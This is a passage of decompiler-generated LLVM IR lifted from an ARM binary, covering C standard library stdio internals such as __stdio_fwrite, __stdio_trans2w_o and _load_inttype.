dec_label_pc_1baf8.dec_label_pc_1bac8_crit_edge:  ; preds = %dec_label_pc_1baf8
  %v0_1bac8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1bac8

dec_label_pc_1bb00:                               ; preds = %dec_label_pc_1baf8
  %v2_1bb00 = icmp ne i32 %v1_1baf8, 0
  store i1 %v2_1bb00, i1* %cpsr_c.global-to-local, align 1
  %v7_1bb04 = icmp slt i32 %v1_1baf8, 2
  br i1 %v7_1bb04, label %dec_label_pc_1bb28, label %dec_label_pc_1bb08

dec_label_pc_1bb08:                               ; preds = %dec_label_pc_1bb00
  %v0_1bb08 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1bb08, i32* %r0.global-to-local, align 4
  %v0_1bb0c = load i32, i32* @r1, align 4
  %v1_1bb0c = add i32 %v0_1bb0c, 129
  store i32 %v1_1bb0c, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1bb28

dec_label_pc_1bb24:                               ; preds = %dec_label_pc_1b768, %dec_label_pc_1b74c, %dec_label_pc_1b774
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1bb28

dec_label_pc_1bb28:                               ; preds = %dec_label_pc_1baa4, %dec_label_pc_1bb00, %bb57, %dec_label_pc_1b7ac, %dec_label_pc_1bb08, %dec_label_pc_1bb24
  %v0_1bb28 = load i32, i32* @r5, align 4
  store i32 %v0_1bb28, i32* %r0.global-to-local, align 4
  %v2_1bb30 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1bb30, i32* @r4, align 4
  store i32 %v6_1b70c, i32* @r5, align 4
  store i32 %v9_1b70c, i32* @r6, align 4
  store i32 %v12_1b70c, i32* @r7, align 4
  store i32 %v15_1b70c, i32* @r8, align 4
  ret i32 %v0_1bb28

; uselistorder directives
  uselistorder i32 %v0_1baf4, { 1, 0, 2 }
  uselistorder i32 %v1_1bad8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1bac8, { 1, 0 }
  uselistorder i32 %v0_1ba78, { 1, 0, 2 }
  uselistorder i32 %v1_1ba5c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1ba4c, { 1, 0 }
  uselistorder i32 %v0_1b9f4, { 1, 0, 2 }
  uselistorder i32 %v1_1b9d8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1b98c, { 1, 0, 2 }
  uselistorder i32 %v1_1b970, { 0, 2, 1 }
  uselistorder i32 %v4_1b94c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1b8fc.pre, { 2, 1, 0 }
  uselistorder i32 %v0_1b880, { 1, 2, 0 }
  uselistorder i32 %v1_1b810, { 1, 0 }
  uselistorder i32 %v0_1b810, { 1, 0 }
  uselistorder i32 %v1_1b7f8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1b79c, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 51, 5, 6, 7, 8, 9, 11, 10, 52, 13, 12, 14, 15, 16, 17, 18, 19, 21, 20, 53, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 50 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 19, 18, 20, 22, 21, 26, 23, 24, 25, 28, 27, 29, 30 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 32, 33, 3, 4, 5, 6, 34, 35, 7, 8, 9, 36, 37, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 16384, { 13, 12, 11, 0, 1, 6, 4, 5, 2, 3, 7, 8, 9, 10 }
  uselistorder i32 (i32)* @isatty, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @__libc_open, { 3, 0, 4, 2, 1 }
  uselistorder i32 131072, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 1, 12, 0, 11, 10, 9, 8, 14, 13, 3, 2, 7, 6, 5, 4 }
  uselistorder i8 97, { 1, 0 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1bb28, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1bb24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1baf8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1bae0, { 1, 0 }
  uselistorder label %dec_label_pc_1baa4, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1ba7c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1ba64, { 1, 0 }
  uselistorder label %dec_label_pc_1ba08, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_1b9f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b9e0, { 1, 0 }
  uselistorder label %dec_label_pc_1b9a0, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_1b990, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b8d8, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_1b840._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1b7e8, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1b784, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b74c, { 1, 2, 0 }
}

define i32 @function_1bb3c(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1bb3c:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_1bb3c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1bb3c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_1bb3c
  %v5_1bb3c = sdiv i32 %arg2, 16
  %v6_1bb3c = and i32 %v5_1bb3c, %tmp
  %v5_1bb40 = sdiv i32 %arg2, 256
  %v6_1bb40 = and i32 %v6_1bb3c, %v5_1bb40
  %v2_1bb5c = load i32, i32* @r8, align 4
  %v4_1bb5c = and i32 %v6_1bb40, %v2_1bb5c
  %v2_1bb60 = trunc i32 %v4_1bb5c to i16
  %v4_1bb60 = inttoptr i32 %v4_1bb5c to i16*
  store i16 %v2_1bb60, i16* %v4_1bb60, align 2
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1bb3c, %bb
  %v10_1bb68 = phi i32 [ %tmp, %dec_label_pc_1bb3c ], [ 0, %bb ]
  ret i32 %v10_1bb68

; uselistorder directives
  uselistorder i32 %v4_1bb5c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg3 to i32
  %stack_var_-20 = alloca i32, align 4
  %v3_1bb6c = load i32, i32* @r4, align 4
  store i32 %v3_1bb6c, i32* %stack_var_-20, align 4
  %v6_1bb6c = load i32, i32* @r5, align 4
  %v9_1bb6c = load i32, i32* @r6, align 4
  %v12_1bb6c = load i32, i32* @r7, align 4
  %v3_1bb70 = load i16, i16* %arg3, align 2
  %v4_1bb70 = zext i16 %v3_1bb70 to i32
  store i32 %v4_1bb70, i32* @r3, align 4
  %v1_1bb74 = and i32 %v4_1bb70, 512
  store i32 %v1_1bb74, i32* @r4, align 4
  %v2_1bb74 = icmp eq i32 %v1_1bb74, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1bb74, label %dec_label_pc_1bb8c, label %dec_label_pc_1bc88

dec_label_pc_1bb8c:                               ; preds = %entry
  %v2_1bb8c = add i32 %tmp, 4
  %v3_1bb8c = inttoptr i32 %v2_1bb8c to i32*
  %v4_1bb8c = load i32, i32* %v3_1bb8c, align 4
  %v2_1bb94 = add i32 %tmp, 16
  %v3_1bb94 = inttoptr i32 %v2_1bb94 to i32*
  %v4_1bb94 = load i32, i32* %v3_1bb94, align 4
  store i32 %v4_1bb94, i32* @r0, align 4
  %v2_1bb98 = add i32 %tmp, 12
  %v3_1bb98 = inttoptr i32 %v2_1bb98 to i32*
  %v4_1bb98 = load i32, i32* %v3_1bb98, align 4
  store i32 %v4_1bb98, i32* @r3, align 4
  %v4_1bb9c = icmp eq i32 %v4_1bb8c, -2
  %v2_1bba0 = sub i32 %v4_1bb98, %v4_1bb94
  br i1 %v4_1bb9c, label %dec_label_pc_1bba0, label %dec_label_pc_1bbc8

dec_label_pc_1bba0:                               ; preds = %dec_label_pc_1bb8c
  %v3_1bba4 = icmp ugt i32 %v2_1bba0, %arg2
  br i1 %v3_1bba4, label %bb, label %bb12

bb:                                               ; preds = %dec_label_pc_1bba0
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_1bba0, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_1bba0, %dec_label_pc_1bba0 ]
  %v0_1bbac = phi i32 [ %arg2, %bb ], [ %v2_1bba0, %dec_label_pc_1bba0 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_1bbac, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1bbb4 = call i32 @memcpy()
  %v0_1bbb8 = load i32, i32* @r5, align 4
  %v1_1bbb8 = add i32 %v0_1bbb8, 16
  %v2_1bbb8 = inttoptr i32 %v1_1bbb8 to i32*
  %v3_1bbb8 = load i32, i32* %v2_1bbb8, align 4
  %v1_1bbbc = load i32, i32* @r4, align 4
  %v2_1bbbc = add i32 %v1_1bbbc, %v3_1bbb8
  store i32 %v2_1bbbc, i32* %v2_1bbb8, align 4
  br label %dec_label_pc_1bc9c

dec_label_pc_1bbc8:                               ; preds = %dec_label_pc_1bb8c
  store i32 %v2_1bba0, i32* @r3, align 4
  %tmp18 = icmp ult i32 %v2_1bba0, %arg2
  br i1 %tmp18, label %dec_label_pc_1bc68, label %dec_label_pc_1bbd4

dec_label_pc_1bbd4:                               ; preds = %dec_label_pc_1bbc8
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_1bbdc = call i32 @memcpy()
  %v0_1bbe0 = load i32, i32* @r5, align 4
  %v1_1bbe0 = add i32 %v0_1bbe0, 16
  %v2_1bbe0 = inttoptr i32 %v1_1bbe0 to i32*
  %v3_1bbe0 = load i32, i32* %v2_1bbe0, align 4
  %v1_1bbe4 = inttoptr i32 %v0_1bbe0 to i16*
  %v2_1bbe4 = load i16, i16* %v1_1bbe4, align 2
  %v1_1bbe8 = load i32, i32* @r6, align 4
  %v2_1bbe8 = add i32 %v1_1bbe8, %v3_1bbe0
  %v1_1bbec = and i16 %v2_1bbe4, 256
  %v2_1bbec = icmp eq i16 %v1_1bbec, 0
  store i32 %v2_1bbe8, i32* %v2_1bbe0, align 4
  br i1 %v2_1bbec, label %dec_label_pc_1bc9c, label %dec_label_pc_1bbf8

dec_label_pc_1bbf8:                               ; preds = %dec_label_pc_1bbd4
  %v0_1bbf8 = load i32, i32* @r7, align 4
  %v0_1bc00 = load i32, i32* @r6, align 4
  %v4_1bc04 = call i32 @memrchr(i32 %v0_1bbf8, i32 10, i32 %v0_1bc00, i32 %v2_1bbe8)
  %v2_1bc08 = icmp eq i32 %v4_1bc04, 0
  br i1 %v2_1bc08, label %dec_label_pc_1bc9c, label %dec_label_pc_1bc10

dec_label_pc_1bc10:                               ; preds = %dec_label_pc_1bbf8
  %v0_1bc10 = load i32, i32* @r5, align 4
  store i32 %v0_1bc10, i32* @r0, align 4
  %v0_1bc14 = call i32 @__stdio_wcommit()
  %v2_1bc18 = icmp eq i32 %v0_1bc14, 0
  br i1 %v2_1bc18, label %dec_label_pc_1bc9c, label %dec_label_pc_1bc20

dec_label_pc_1bc20:                               ; preds = %dec_label_pc_1bc10
  %v1_1bc20 = load i32, i32* @r6, align 4
  %v3_1bc20 = icmp uge i32 %v0_1bc14, %v1_1bc20
  %v1_1bc20.v0_1bc14 = select i1 %v3_1bc20, i32 %v1_1bc20, i32 %v0_1bc14
  store i32 %v1_1bc20.v0_1bc14, i32* @r4, align 4
  %v2_1bc2c = sub i32 %v1_1bc20, %v1_1bc20.v0_1bc14
  %v0_1bc30 = load i32, i32* @r7, align 4
  %v2_1bc30 = add i32 %v0_1bc30, %v2_1bc2c
  store i32 %v2_1bc30, i32* %r7.global-to-local, align 4
  store i32 %v2_1bc30, i32* @r0, align 4
  store i32 %v1_1bc20.v0_1bc14, i32* @r2, align 4
  %v4_1bc40 = call i32 @__GI_memchr(i32 %v2_1bc30, i32 10, i32 %v1_1bc20.v0_1bc14, i32 %v2_1bc2c)
  %v2_1bc44 = icmp eq i32 %v4_1bc40, 0
  br i1 %v2_1bc44, label %dec_label_pc_1bc9c, label %dec_label_pc_1bc4c

dec_label_pc_1bc4c:                               ; preds = %dec_label_pc_1bc20
  %v0_1bc4c = load i32, i32* @r5, align 4
  %v1_1bc4c = add i32 %v0_1bc4c, 16
  %v2_1bc4c = inttoptr i32 %v1_1bc4c to i32*
  %v3_1bc4c = load i32, i32* %v2_1bc4c, align 4
  %v0_1bc50 = load i32, i32* %r7.global-to-local, align 4
  %v1_1bc50 = load i32, i32* @r4, align 4
  %v2_1bc50 = sub i32 %v0_1bc50, %v4_1bc40
  %v2_1bc54 = add i32 %v2_1bc50, %v1_1bc50
  %v2_1bc58 = sub i32 %v3_1bc4c, %v2_1bc54
  %v1_1bc5c = load i32, i32* @r6, align 4
  %v2_1bc5c = sub i32 %v1_1bc5c, %v2_1bc54
  store i32 %v2_1bc5c, i32* @r6, align 4
  store i32 %v2_1bc58, i32* %v2_1bc4c, align 4
  br label %dec_label_pc_1bc9c

dec_label_pc_1bc68:                               ; preds = %dec_label_pc_1bbc8
  %v2_1bc68 = add i32 %tmp, 8
  %v3_1bc68 = inttoptr i32 %v2_1bc68 to i32*
  %v4_1bc68 = load i32, i32* %v3_1bc68, align 4
  store i32 %v4_1bc68, i32* @r3, align 4
  %v9_1bc6c = icmp eq i32 %v4_1bb94, %v4_1bc68
  br i1 %v9_1bc6c, label %dec_label_pc_1bc88, label %dec_label_pc_1bc74

dec_label_pc_1bc74:                               ; preds = %dec_label_pc_1bc68
  store i32 %tmp, i32* @r0, align 4
  %v0_1bc78 = call i32 @__stdio_wcommit()
  %v2_1bc7c = icmp eq i32 %v0_1bc78, 0
  br i1 %v2_1bc7c, label %dec_label_pc_1bc74.dec_label_pc_1bc88_crit_edge, label %bb15

dec_label_pc_1bc74.dec_label_pc_1bc88_crit_edge:  ; preds = %dec_label_pc_1bc74
  %v0_1bc88.pre = load i32, i32* @r6, align 4
  %v0_1bc8c.pre = load i32, i32* @r5, align 4
  %v0_1bc90.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1bc88

bb15:                                             ; preds = %dec_label_pc_1bc74
  %v1_1bc80 = load i32, i32* @r4, align 4
  store i32 %v1_1bc80, i32* @r6, align 4
  br label %dec_label_pc_1bc9c

dec_label_pc_1bc88:                               ; preds = %dec_label_pc_1bc74.dec_label_pc_1bc88_crit_edge, %entry, %dec_label_pc_1bc68
  %v0_1bc90 = phi i32 [ %v0_1bc90.pre, %dec_label_pc_1bc74.dec_label_pc_1bc88_crit_edge ], [ %arg1, %entry ], [ %arg1, %dec_label_pc_1bc68 ]
  %v0_1bc8c = phi i32 [ %v0_1bc8c.pre, %dec_label_pc_1bc74.dec_label_pc_1bc88_crit_edge ], [ %tmp, %entry ], [ %tmp, %dec_label_pc_1bc68 ]
  %v0_1bc88 = phi i32 [ %v0_1bc88.pre, %dec_label_pc_1bc74.dec_label_pc_1bc88_crit_edge ], [ %arg2, %entry ], [ %arg2, %dec_label_pc_1bc68 ]
  %v1_1bc8c = inttoptr i32 %v0_1bc8c to i16*
  %v5_1bc94 = call i32 @__stdio_WRITE(i16* %v1_1bc8c, i32 %v0_1bc90, i32 %v0_1bc88)
  store i32 %v5_1bc94, i32* @r6, align 4
  br label %dec_label_pc_1bc9c

dec_label_pc_1bc9c:                               ; preds = %bb15, %dec_label_pc_1bc20, %dec_label_pc_1bc10, %dec_label_pc_1bbf8, %dec_label_pc_1bbd4, %dec_label_pc_1bc4c, %bb12, %dec_label_pc_1bc88
  %v0_1bc9c = load i32, i32* @r6, align 4
  %v2_1bca4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1bca4, i32* @r4, align 4
  store i32 %v6_1bb6c, i32* @r5, align 4
  store i32 %v9_1bb6c, i32* @r6, align 4
  store i32 %v12_1bb6c, i32* @r7, align 4
  ret i32 %v0_1bc9c

; uselistorder directives
  uselistorder i32 %v2_1bc54, { 1, 0 }
  uselistorder i32 %v2_1bc2c, { 1, 0 }
  uselistorder i32 %v1_1bc20.v0_1bc14, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1bc20, { 1, 0, 2 }
  uselistorder i32 %v2_1bba0, { 2, 4, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_1bc9c, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_1bc88, { 0, 2, 1 }
  uselistorder label %bb12, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1bcac = load i32, i32* @r4, align 4
  store i32 %v3_1bcac, i32* %stack_var_-8, align 4
  %v3_1bcb0 = load i16, i16* %arg1, align 2
  %v4_1bcb0 = zext i16 %v3_1bcb0 to i32
  %v2_1bcb4 = and i32 %v4_1bcb0, %arg2
  %v4_1bcb4 = icmp eq i32 %v2_1bcb4, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_1bcb4, label %dec_label_pc_1bcc0, label %dec_label_pc_1bcd0

dec_label_pc_1bcc0:                               ; preds = %entry
  %v1_1bcc0 = and i32 %v4_1bcb0, 2176
  %v2_1bcc0 = icmp eq i32 %v1_1bcc0, 0
  br i1 %v2_1bcc0, label %dec_label_pc_1bcc8, label %dec_label_pc_1bcdc

dec_label_pc_1bcc8:                               ; preds = %dec_label_pc_1bcc0
  %v2_1bcc8 = or i32 %v4_1bcb0, %arg2
  %v1_1bccc = trunc i32 %v2_1bcc8 to i16
  store i16 %v1_1bccc, i16* %arg1, align 2
  %v0_1bcd0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1bcd0

dec_label_pc_1bcd0:                               ; preds = %entry, %dec_label_pc_1bcc8
  %v0_1bd14 = phi i32 [ %tmp, %entry ], [ %v0_1bcd0.pre, %dec_label_pc_1bcc8 ]
  %v1_1bcd0 = inttoptr i32 %v0_1bd14 to i16*
  %v2_1bcd0 = load i16, i16* %v1_1bcd0, align 2
  %v3_1bcd0 = zext i16 %v2_1bcd0 to i32
  store i32 %v3_1bcd0, i32* @ip, align 4
  %v1_1bcd4 = and i32 %v3_1bcd0, 32
  %v2_1bcd4 = icmp eq i32 %v1_1bcd4, 0
  br i1 %v2_1bcd4, label %dec_label_pc_1bd04, label %dec_label_pc_1bcdc

dec_label_pc_1bcdc:                               ; preds = %dec_label_pc_1bcc0, %dec_label_pc_1bcd0
  %v0_1bce0 = call i32 @__aeabi_read_tp()
  store i32 %v0_1bce0, i32* %r0.global-to-local, align 4
  %v3_1bce4 = load i16, i16* @global_var_32088.1320, align 2
  %v4_1bce4 = sext i16 %v3_1bce4 to i32
  store i32 9, i32* %r2.global-to-local, align 4
  %v3_1bcec = add i32 %v4_1bce4, %v0_1bce0
  %v4_1bcec = inttoptr i32 %v3_1bcec to i32*
  store i32 9, i32* %v4_1bcec, align 4
  br label %dec_label_pc_1bcf0

dec_label_pc_1bcf0:                               ; preds = %dec_label_pc_1bd2c, %dec_label_pc_1bcdc
  %v0_1bcf0 = load i32, i32* @r4, align 4
  %v1_1bcf0 = inttoptr i32 %v0_1bcf0 to i16*
  %v2_1bcf0 = load i16, i16* %v1_1bcf0, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1bcf8 = or i16 %v2_1bcf0, 8
  store i16 %v1_1bcf8, i16* %v1_1bcf0, align 2
  br label %bb11

dec_label_pc_1bd04:                               ; preds = %dec_label_pc_1bcd0
  %tmp14 = urem i16 %v2_1bcd0, 4
  %v2_1bd04 = icmp eq i16 %tmp14, 0
  br i1 %v2_1bd04, label %dec_label_pc_1bd60, label %dec_label_pc_1bd0c

dec_label_pc_1bd0c:                               ; preds = %dec_label_pc_1bd04
  %v1_1bd0c = and i32 %v3_1bcd0, 4
  store i32 %v1_1bd0c, i32* @r1, align 4
  %v2_1bd0c = icmp eq i32 %v1_1bd0c, 0
  br i1 %v2_1bd0c, label %dec_label_pc_1bd14, label %dec_label_pc_1bd44

dec_label_pc_1bd14:                               ; preds = %dec_label_pc_1bd0c
  %v1_1bd14 = add i32 %v0_1bd14, 20
  %v2_1bd14 = inttoptr i32 %v1_1bd14 to i32*
  %v3_1bd14 = load i32, i32* %v2_1bd14, align 4
  store i32 %v3_1bd14, i32* %r2.global-to-local, align 4
  %v1_1bd18 = add i32 %v0_1bd14, 16
  %v2_1bd18 = inttoptr i32 %v1_1bd18 to i32*
  %v3_1bd18 = load i32, i32* %v2_1bd18, align 4
  %v9_1bd1c = icmp eq i32 %v3_1bd14, %v3_1bd18
  br i1 %v9_1bd1c, label %dec_label_pc_1bd24, label %dec_label_pc_1bd2c

dec_label_pc_1bd24:                               ; preds = %dec_label_pc_1bd14
  %v1_1bd24 = and i32 %v3_1bcd0, 2
  %v2_1bd24 = icmp eq i32 %v1_1bd24, 0
  br i1 %v2_1bd24, label %dec_label_pc_1bd44, label %dec_label_pc_1bd2c

dec_label_pc_1bd2c:                               ; preds = %dec_label_pc_1bd14, %dec_label_pc_1bd24
  %v1_1bd2c = and i32 %v3_1bcd0, 1024
  %tmp12 = udiv i32 %v1_1bd2c, 1024
  %tmp13 = add nuw nsw i32 %tmp12, 1
  store i32 %tmp13, i32* %r2.global-to-local, align 4
  %v0_1bd38 = call i32 @__GI_fseek()
  store i32 %v0_1bd38, i32* %r0.global-to-local, align 4
  %v2_1bd3c = icmp eq i32 %v0_1bd38, 0
  br i1 %v2_1bd3c, label %.dec_label_pc_1bd44_crit_edge, label %dec_label_pc_1bcf0

.dec_label_pc_1bd44_crit_edge:                    ; preds = %dec_label_pc_1bd2c
  %v0_1bd44.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1bd44

dec_label_pc_1bd44:                               ; preds = %.dec_label_pc_1bd44_crit_edge, %dec_label_pc_1bd0c, %dec_label_pc_1bd24
  %v2_1bd50 = phi i32 [ %v0_1bd44.pre, %.dec_label_pc_1bd44_crit_edge ], [ %v0_1bd14, %dec_label_pc_1bd0c ], [ %v0_1bd14, %dec_label_pc_1bd24 ]
  %v1_1bd44 = inttoptr i32 %v2_1bd50 to i16*
  %v2_1bd44 = load i16, i16* %v1_1bd44, align 2
  %v1_1bd48 = add i32 %v2_1bd50, 8
  %v2_1bd48 = inttoptr i32 %v1_1bd48 to i32*
  %v3_1bd48 = load i32, i32* %v2_1bd48, align 4
  store i32 %v3_1bd48, i32* %r2.global-to-local, align 4
  %v1_1bd4c = and i16 %v2_1bd44, -4
  store i16 %v1_1bd4c, i16* %v1_1bd44, align 2
  %v0_1bd54 = load i32, i32* %r2.global-to-local, align 4
  %v1_1bd54 = load i32, i32* @r4, align 4
  %v2_1bd54 = add i32 %v1_1bd54, 20
  %v3_1bd54 = inttoptr i32 %v2_1bd54 to i32*
  store i32 %v0_1bd54, i32* %v3_1bd54, align 4
  %v0_1bd58 = load i32, i32* %r2.global-to-local, align 4
  %v1_1bd58 = load i32, i32* @r4, align 4
  %v2_1bd58 = add i32 %v1_1bd58, 24
  %v3_1bd58 = inttoptr i32 %v2_1bd58 to i32*
  store i32 %v0_1bd58, i32* %v3_1bd58, align 4
  %v0_1bd5c = load i32, i32* %r2.global-to-local, align 4
  %v1_1bd5c = load i32, i32* @r4, align 4
  %v2_1bd5c = add i32 %v1_1bd5c, 16
  %v3_1bd5c = inttoptr i32 %v2_1bd5c to i32*
  store i32 %v0_1bd5c, i32* %v3_1bd5c, align 4
  %v0_1bd60.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1bd60

dec_label_pc_1bd60:                               ; preds = %dec_label_pc_1bd04, %dec_label_pc_1bd44
  %v2_1bd6c = phi i32 [ %v0_1bd14, %dec_label_pc_1bd04 ], [ %v0_1bd60.pre, %dec_label_pc_1bd44 ]
  %v1_1bd60 = inttoptr i32 %v2_1bd6c to i16*
  %v2_1bd60 = load i16, i16* %v1_1bd60, align 2
  %v3_1bd60 = zext i16 %v2_1bd60 to i32
  %v1_1bd64 = or i16 %v2_1bd60, 64
  %v1_1bd68 = and i32 %v3_1bd60, 2816
  store i32 %v1_1bd68, i32* %r0.global-to-local, align 4
  %v2_1bd68 = icmp eq i32 %v1_1bd68, 0
  store i16 %v1_1bd64, i16* %v1_1bd60, align 2
  br i1 %v2_1bd68, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_1bd60
  %v1_1bd70 = load i32, i32* @r4, align 4
  %v2_1bd70 = add i32 %v1_1bd70, 12
  %v3_1bd70 = inttoptr i32 %v2_1bd70 to i32*
  %v4_1bd70 = load i32, i32* %v3_1bd70, align 4
  %v3_1bd74 = add i32 %v1_1bd70, 28
  %v4_1bd74 = inttoptr i32 %v3_1bd74 to i32*
  store i32 %v4_1bd70, i32* %v4_1bd74, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_1bd60
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_1bcf0, %.thread1
  %v2_1bd7c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1bd7c, i32* @r4, align 4
  %v1_1bd80 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1bd80

; uselistorder directives
  uselistorder i32 %v2_1bd50, { 1, 0 }
  uselistorder i32 %v0_1bd14, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_1bcb0, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 4, 3, 5 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1bd60, { 1, 0 }
  uselistorder label %dec_label_pc_1bd44, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1bd2c, { 1, 0 }
  uselistorder label %dec_label_pc_1bcdc, { 1, 0 }
  uselistorder label %dec_label_pc_1bcd0, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_1bd88 = load i32, i32* @r2, align 4
  %v1_1bd88 = icmp slt i32 %v0_1bd88, 0
  %v0_1bd8c = load i32, i32* @r0, align 4
  %v1_1bd90 = and i32 %v0_1bd8c, 2048
  %v2_1bdc4 = icmp eq i32 %v1_1bd90, 0
  br i1 %v1_1bd88, label %dec_label_pc_1bdc4, label %dec_label_pc_1bd98

dec_label_pc_1bd98:                               ; preds = %entry
  br i1 %v2_1bdc4, label %dec_label_pc_1bda0, label %dec_label_pc_1bdcc

dec_label_pc_1bda0:                               ; preds = %dec_label_pc_1bd98
  %v7_1bda0 = icmp eq i32 %v0_1bd8c, 256
  %v0_1bda4 = load i32, i32* @r1, align 4
  %v1_1bda4 = inttoptr i32 %v0_1bda4 to i32*
  %v2_1bda4 = load i32, i32* %v1_1bda4, align 4
  %v2_1bda8 = urem i32 %v2_1bda4, 256
  %v2_1bda8.v2_1bda4 = select i1 %v7_1bda0, i32 %v2_1bda8, i32 %v2_1bda4
  br i1 %v7_1bda0, label %.thread, label %dec_label_pc_1bdb0

dec_label_pc_1bdb0:                               ; preds = %dec_label_pc_1bda0
  %v7_1bdb0 = icmp eq i32 %v0_1bd8c, 512
  br i1 %v7_1bdb0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1bdb0
  %v4_1bdb8 = urem i32 %v2_1bda8.v2_1bda4, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1bdb0, %dec_label_pc_1bda0, %bb
  %v1_1bdc0 = phi i32 [ %v2_1bda4, %dec_label_pc_1bdb0 ], [ %v2_1bda8, %dec_label_pc_1bda0 ], [ %v4_1bdb8, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_1bdc0

dec_label_pc_1bdc4:                               ; preds = %entry
  br i1 %v2_1bdc4, label %dec_label_pc_1bdd4, label %dec_label_pc_1bdcc

